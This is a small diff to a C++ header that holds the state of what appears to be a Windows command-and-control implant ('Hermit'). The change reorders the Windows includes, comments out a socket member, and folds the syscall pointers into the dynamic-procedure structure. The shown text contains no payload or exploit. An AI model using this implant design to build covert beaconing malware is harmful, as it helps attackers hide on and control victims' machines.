@@ -1,17 +1,17 @@
 #ifndef HERMIT_CORE_STATE_HPP
 #define HERMIT_CORE_STATE_HPP
 
-#include <winsock2.h>
-#include <winternl.h>
-#include <windows.h>
-#include <winhttp.h>
-
 #include "core/crypt.hpp"
 #include "core/socket.hpp"
 #include "core/parser.hpp"
 #include "core/procs.hpp"
 #include "core/syscalls.hpp"
 #include "core/system.hpp"
+
+// #include <winsock2.h>
+#include <winternl.h>
+#include <windows.h>
+#include <winhttp.h>
 
 using json = nlohmann::json;
 
@@ -29,11 +29,8 @@ namespace State
         HMODULE             hNTDLL;
         HMODULE             hWinHTTPDLL;
 
-        // Procedures loaded dynamatically
+        // Procedures loaded dynamatically (including syscalls)
         Procs::PPROCS       pProcs;
-
-        // Syscalls (this values will be assigned everytime we call a syscall)
-        Syscalls::PSYSCALLS pSyscalls;
 
         // wWinMain arguments
         HINSTANCE           hInstance;
@@ -75,7 +72,7 @@ namespace State
         HINTERNET           hRequest;
 
         // Socket
-        Socket::PSOCKET_DATA pSocket;
+        // Socket::PSOCKET_DATA pSocket;
 
         // Quit beacon
         BOOL                bQuit;
